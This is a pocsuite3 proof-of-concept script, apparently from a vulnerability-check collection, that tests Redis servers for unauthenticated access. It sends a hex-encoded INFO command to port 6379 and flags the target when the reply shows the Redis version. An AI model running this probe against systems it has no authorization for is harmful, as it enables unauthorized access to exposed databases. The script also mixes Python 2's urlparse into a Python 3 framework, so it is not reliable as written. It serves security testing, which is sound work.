#!/usr/bin/env python
# -*- coding:utf-8 -*-

import socket
import urlparse
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase


class TestPOC(POCBase):
    vulID = '无'
    version = '1.0'
    author = ['aideyisu']
    vulDate = '2015-10-26'
    createDate = '2020-12-07'
    updateDate = '2020-12-07'
    references = ['http://sebug.net/vuldb/ssvid-89339']
    name = 'Redis 未授权访问 PoC'
    appPowerLink = 'http://redis.io/'
    appName = 'Redis'
    appVersion = 'All'
    vulType = 'Unauthorized access'
    desc = '''
        redis 默认不需要密码即可访问，黑客直接访问即可获取数据库中所有信息，造成严重的信息泄露。
    '''
    samples = ['']

    def _verify(self):
        result = {}
        payload = '\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a'
        s = socket.socket()
        socket.setdefaulttimeout(10)
        try:
            host = urlparse.urlparse(self.url).netloc
            port = 6379
            s.connect((host, port))
            s.send(payload)
            recvdata = s.recv(1024)
            if recvdata and 'redis_version' in recvdata:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Port'] = port
        except:
            pass
        s.close()
        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

register_poc(TestPOC)
